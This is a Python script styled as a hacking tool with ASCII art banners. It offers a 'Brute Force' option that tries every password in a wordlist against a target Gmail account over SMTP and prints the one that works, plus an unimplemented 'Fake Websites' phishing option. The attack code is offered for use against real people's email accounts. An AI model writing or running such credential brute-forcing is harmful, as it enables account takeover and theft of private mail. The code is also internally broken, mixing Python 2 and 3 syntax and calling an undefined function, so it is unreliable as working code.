import os, sys, time
import smtplib
from time import sleep as timeout
os.system("figlet Brute Force")
def virus():
   print('\033[1;31m    __       _                ')
   time.sleep(0.1)
   print('\033[1;33;40m   / /      (_)               ')
   time.sleep(0.1)
   print('\033[1;35;40m  / /___   ___ _ __ _   _ ___ ')
   time.sleep(0.1)
   print("\033[1;36;40m | '_ \ \ / / | '__| | | / __|")
   time.sleep(0.1)
   print("\033[0;37;40m | (_) \ V /| | |  | |_| \__ \ ")
   time.sleep(0.1)
   print("\033[1;31;40m  \___/ \_/ |_|_|   \__,_|___/")
   time.sleep(0.1)
   print("================================")
   print("\033[1;37;40m        Coded by @1zsb          ")
   print("================================\n")
   print("                           ______")
   time.sleep(0.1)
   print("\033[1;37;40m        |\_______________ (_____\\______________")
   time.sleep(0.1)
   print("\033[1;31;40mHH======#H###############H#######################")
   time.sleep(0.1)
   print('\033[1;37;40m        " ~""""""""""""""`##(_))#H\"""""Y########')
   time.sleep(0.1)
   print('                          ))    \#H\       `"Y###')
   time.sleep(0.1)
   print('                          "      }#H)\n')
virus()
mawar = "\033[31;1m"

print("[1] Brute Force")
print("[2] Fake Websites\n")
option = input('root@root:~# ')

if option == 1:
   os.system("clear")
   virus()
   smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
   smtpserver.ehlo()
   smtpserver.starttls()

   user = raw_input(mawar+"-->[!] Enter Email Target: ")
   passwd = raw_input(mawar+"-->[!] Path and Name Wordlist: ")
   passwd = open(passwd, "r")

   for password in passwd:
       try:
                               smtpserver.login(user, password)
                               system("clear")
                               virus()
                               print mawar+"\n"
                               print mawar+"-->[!] Password Detected :" + password
                               break
       except smtplib.SMTPAuthenticationError as e:
                   error = str(e)
                   if error[14] == '<':
                               system('clear')
                               virus()
                               print "\n"
                               print mawar+"-->[!] Password Failed!:" + password
                               break
                   else:
                           print mawar+"-->[!] Password Failed!:" + password
else:
    print("Soon")

